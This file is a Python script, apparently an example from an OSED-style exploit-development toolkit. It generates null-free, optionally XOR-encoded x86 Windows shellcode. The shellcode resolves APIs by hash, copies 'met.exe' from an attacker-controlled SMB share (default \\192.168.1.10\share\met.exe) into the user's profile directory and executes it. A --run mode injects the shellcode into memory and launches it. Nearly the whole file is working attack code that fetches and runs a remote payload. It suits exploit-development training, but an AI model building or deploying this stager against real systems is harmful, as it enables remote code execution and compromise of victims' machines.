#!/usr/bin/env -S uv run
"""
Example 05 — File-copy-and-execute (manual ASM + full toolkit helpers).

This mirrors a real OSED-style payload:
  1. PEB walk → kernel32
  2. Resolve: LoadLibraryA, CreateProcessA, TerminateProcess, MoveFileA, lstrcatA
  3. LoadLibraryA("advapi32.dll") → OpenProcessToken
  4. LoadLibraryA("userenv.dll")  → GetUserProfileDirectoryA
  5. OpenProcessToken(current process, TOKEN_QUERY) → hToken
  6. GetUserProfileDirectoryA(hToken, buf, &size)   → user profile path
  7. lstrcatA(buf, "\\met.exe")                      → full local path
  8. MoveFileA("\\\\attacker\\share\\met.exe", buf)  → copy from SMB share
  9. CreateProcessA(NULL, buf)                        → execute the dropped file
 10. TerminateProcess(current, 0)

Key toolkit usage:
  - ror_hash()             computes every function hash (no magic constants)
  - build_resolve_block()  emits the push/call/mov triplets for kernel32
  - build_load_and_resolve() handles LoadLibraryA + resolve for each extra DLL
  - stack_string_pushes()  produces null-free push sequences for DLL names
  - SlotAllocator          tracks all EBP offsets automatically
  - check_bad_chars()      verifies the assembled bytes before sending

Usage:
    uv run Examples/05_file_copy_exec.py --smb "\\\\\\\\192.168.1.10\\\\share\\\\met.exe" --asm
    uv run Examples/05_file_copy_exec.py --smb "\\\\\\\\192.168.1.10\\\\share\\\\met.exe" --hashes
    uv run Examples/05_file_copy_exec.py --smb "\\\\\\\\192.168.1.10\\\\share\\\\met.exe" --hex
    uv run Examples/05_file_copy_exec.py --smb "\\\\\\\\192.168.1.10\\\\share\\\\met.exe" --run
"""
import argparse
import ctypes
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from Tools.shellcode_x86_win import (
    assemble,
    ror_hash,
    stack_string_pushes,
    SlotAllocator,
)
from Tools.shellcode_x86_win.assembler import check_bad_chars


def xor_encode(sc, bad_chars):
    bad = set(bad_chars)
    for k in range(1, 256):
        if k in bad:
            continue
        encoded = bytes(b ^ k for b in sc)
        if not any(b in bad for b in encoded):
            stub = (
                f"decoder:\n    jmp  get_sc\ngot_sc:\n    pop  edi\n"
                f"    mov  ecx, {hex(len(encoded))}\ndecode_loop:\n"
                f"    xor  byte ptr [edi + ecx - 1], {hex(k)}\n"
                f"    loop decode_loop\n    jmp  edi\nget_sc:\n    call got_sc\n"
            )
            stub_sc, _ = assemble(stub)
            return bytes(stub_sc) + encoded, k
    raise ValueError("No single-byte XOR key avoids all bad bytes")
from Tools.shellcode_x86_win.builders import (
    _PROLOGUE,
    _FIND_KERNEL32,
    _FIND_FUNCTION_THUNK,
    _find_function_asm,
    build_resolve_block,
    build_load_and_resolve,
)

ALGO = "ror"
ROT  = 13

# ── Function lists ─────────────────────────────────────────────────────────────
KERNEL32_FUNCS  = ["LoadLibraryA", "TerminateProcess", "CreateProcessA",
                   "MoveFileA", "lstrcatA"]
ADVAPI32_FUNCS  = ["OpenProcessToken"]
USERENV_FUNCS   = ["GetUserProfileDirectoryA"]


def build_asm(smb_path: str):
    slots = SlotAllocator()

    # ── Core machinery ─────────────────────────────────────────────────────────
    core = "\n".join([
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(ALGO, ROT),
    ])

    # ── Resolve from kernel32 ──────────────────────────────────────────────────
    k32_block = build_resolve_block(
        KERNEL32_FUNCS, ALGO, ROT, slots, label="resolve_kernel32",
    )

    # ── Load advapi32 + resolve OpenProcessToken ───────────────────────────────
    adv_block = build_load_and_resolve(
        "advapi32.dll", ADVAPI32_FUNCS, ALGO, ROT, slots,
    )

    # ── Load userenv + resolve GetUserProfileDirectoryA ───────────────────────
    uev_block = build_load_and_resolve(
        "userenv.dll", USERENV_FUNCS, ALGO, ROT, slots,
    )

    # ── Custom payload ─────────────────────────────────────────────────────────
    # Retrieve all needed slot offsets from the allocator
    s_terminate  = slots.slot("TerminateProcess")
    s_create     = slots.slot("CreateProcessA")
    s_move       = slots.slot("MoveFileA")
    s_lstrcat    = slots.slot("lstrcatA")
    s_opentoken  = slots.slot("OpenProcessToken")
    s_getprofile = slots.slot("GetUserProfileDirectoryA")

    # Null-free push sequence for the SMB path
    smb_pushes = "\n".join(f"    {p}" for p in stack_string_pushes(smb_path))

    payload = f"""\
; ── OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) ──────────────
; TOKEN_QUERY = 0x08  (build without null: inc ecx; shl ecx, 3)
; GetCurrentProcess() = 0xffffffff pseudo-handle
; hToken output: written to [esp] on entry, ESI points there so we can read it
;
call_OpenProcessToken:
    mov   ebx, esp                   ; EBX = profile path buffer ptr (reused later)
    mov   esi, esp                   ; ESI = &hToken output slot
    push  esi                        ; [out] pTokenHandle
    xor   ecx, ecx
    inc   ecx
    shl   ecx, 0x03                  ; ECX = TOKEN_QUERY (0x08)
    push  ecx
    push  0xffffffff                 ; hProcess = GetCurrentProcess()
    call  dword ptr [ebp+{hex(s_opentoken)}]        ; OpenProcessToken

; ── GetUserProfileDirectoryA(hToken, buf, &size) ─────────────────────────────
; buf = 128-byte area at EBX (current top of stack region)
; size = 128 → build null-free: inc eax twice then shl eax, 6 (= ×64 = 128 when eax=2)
;
call_GetUserProfileDirectoryA:
    xor   eax, eax
    inc   eax
    inc   eax
    shl   eax, 6                     ; EAX = 128
    push  eax                        ; lpcchSize
    push  esp                        ; &lpcchSize
    push  ebx                        ; lpProfileDir (our 128-byte buffer)
    mov   esi, [esi]                 ; dereference: ESI = hToken value
    push  esi
    call  dword ptr [ebp+{hex(s_getprofile)}]       ; GetUserProfileDirectoryA

; ── lstrcatA(buf, "\\met.exe") ───────────────────────────────────────────────
; "\\met.exe" bytes: 5c 6d 65 74 2e 65 78 65 — no null bytes
; Push right-to-left as two dwords + null terminator
;
call_lstrcatA:
    xor   eax, eax
    push  eax                        ; null terminator
    push  0x6578652e                 ; ".exe" (2e 65 78 65)
    push  0x74656d5c                 ; "\\met" (5c 6d 65 74)
    push  esp                        ; &"\\met.exe"
    push  ebx                        ; lpString1 = profile path buffer
    call  dword ptr [ebp+{hex(s_lstrcat)}]          ; lstrcatA(buf, "\\met.exe")

; ── MoveFileA(smb_path, local_path) ─────────────────────────────────────────
; SMB path pushed null-free via stack_string_pushes()
;
call_MoveFileA:
{smb_pushes}
    lea   esi, [esp]                 ; ESI = pointer to SMB path on stack
    push  ebx                        ; lpNewFileName = profile_path + "\\met.exe"
    push  esi                        ; lpExistingFileName = SMB UNC path
    call  dword ptr [ebp+{hex(s_move)}]             ; MoveFileA

; ── CreateProcessA(NULL, local_path, ...) ───────────────────────────────────
; STARTUPINFOA built on stack (cb=0x44, everything else zero)
; lpProcessInformation at ESP-0x390 to avoid overwriting STARTUPINFOA
;
create_startupinfoa:
    xor   eax, eax
    push  eax                        ; hStdError
    push  eax                        ; hStdOutput
    push  eax                        ; hStdInput
    push  eax                        ; lpReserved2
    push  eax                        ; cbReserved2 + wShowWindow
    push  eax                        ; dwFlags
    push  eax                        ; dwFillAttribute
    push  eax                        ; dwYCountChars
    push  eax                        ; dwXCountChars
    push  eax                        ; dwYSize
    push  eax                        ; dwXSize
    push  eax                        ; dwY
    push  eax                        ; dwX
    push  eax                        ; lpTitle
    push  eax                        ; lpDesktop
    push  eax                        ; lpReserved
    mov   al, 0x44                   ; sizeof(STARTUPINFOA)
    push  eax
    push  esp
    pop   edi                        ; EDI = &STARTUPINFOA

call_CreateProcessA:
    mov   eax, esp
    xor   ecx, ecx
    mov   cx, 0x390
    sub   eax, ecx                   ; lpProcessInformation (well below frame)
    push  eax
    push  edi                        ; lpStartupInfo
    xor   eax, eax
    push  eax                        ; lpCurrentDirectory
    push  eax                        ; lpEnvironment
    push  eax                        ; dwCreationFlags
    inc   eax
    push  eax                        ; bInheritHandles = TRUE
    dec   eax
    push  eax                        ; lpThreadAttributes
    push  eax                        ; lpProcessAttributes
    push  ebx                        ; lpCommandLine = full local path
    push  eax                        ; lpApplicationName = NULL
    call  dword ptr [ebp+{hex(s_create)}]           ; CreateProcessA

; ── TerminateProcess(current, 0) ─────────────────────────────────────────────
exit:
    xor   eax, eax
    push  eax
    push  0xffffffff
    call  dword ptr [ebp+{hex(s_terminate)}]        ; TerminateProcess
"""

    asm = "\n".join([core, k32_block, adv_block, uev_block, payload])
    return asm, slots


def build(smb_path: str, bad: bytes = b""):
    asm, slots = build_asm(smb_path)
    sc, count = assemble(asm)
    sc = bytes(sc)
    print(f"[*] Assembled: {count} instructions, {len(sc)} bytes")

    hits = check_bad_chars(sc, b"\x00")
    if hits:
        print(f"[!] {len(hits)} null byte(s) in shellcode")

    hits = check_bad_chars(sc, bad) if bad else []
    if hits:
        print(f"[*] {len(hits)} bad byte(s) — encoding")
        sc, key = xor_encode(sc, bad)
        print(f"[*] key=0x{key:02x}")
        print(f"[*] Encoded: {len(sc)} bytes")
    elif bad:
        print(f"[*] Clean against {bad.hex()}")

    return sc, asm, slots


def run(sc: bytes) -> None:
    buf = bytearray(sc)
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0), ctypes.c_int(len(buf)),
        ctypes.c_int(0x3000), ctypes.c_int(0x40))
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        (ctypes.c_char * len(buf)).from_buffer(buf),
        ctypes.c_int(len(buf)))
    print(f"[*] Shellcode at {hex(ptr)}")
    input("Press ENTER to execute...")
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr),
        ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def main() -> None:
    ap = argparse.ArgumentParser(description="Example 05: File-copy-and-execute")
    ap.add_argument("--smb",    default=r"\\192.168.1.10\share\met.exe",
                    help="SMB UNC source path")
    ap.add_argument("--asm",    action="store_true")
    ap.add_argument("--slots",  action="store_true", help="Print EBP slot table")
    ap.add_argument("--hashes", action="store_true")
    ap.add_argument("--hex",    action="store_true")
    ap.add_argument("--bad",    default="",  help="Bad bytes hex e.g. 000a0d")
    ap.add_argument("--out",    default="",  help="Write raw bytes to file")
    ap.add_argument("--run",    action="store_true")
    args = ap.parse_args()

    if args.hashes:
        funcs = KERNEL32_FUNCS + ADVAPI32_FUNCS + USERENV_FUNCS
        print(f"ROR-{ROT} hashes:")
        for fn in funcs:
            print(f"  {hex(ror_hash(fn, ROT))}  {fn}")
        return

    asm, slots = build_asm(args.smb)

    if args.asm:
        print(asm)
        return

    if args.slots:
        print("EBP slot layout:")
        for name, off in sorted(slots.table().items(), key=lambda x: x[1]):
            print(f"  [ebp+{hex(off)}]  {name}")
        return

    bad = bytes.fromhex(args.bad) if args.bad else b""

    try:
        sc, _, _ = build(args.smb, bad)
    except SystemExit:
        print("[!] keystone-engine not installed — use --asm to view source")
        return

    if args.hex or (not args.out and not args.run):
        print(f'\n# {len(sc)} bytes')
        print('"' + "".join(f"\\x{b:02x}" for b in sc) + '"')

    if args.out:
        Path(args.out).write_bytes(sc)
        print(f"[+] Wrote {len(sc)} bytes → {args.out}")

    if args.run:
        if sys.platform != "win32":
            print("[!] --run requires Windows")
            return
        run(sc)


if __name__ == "__main__":
    main()
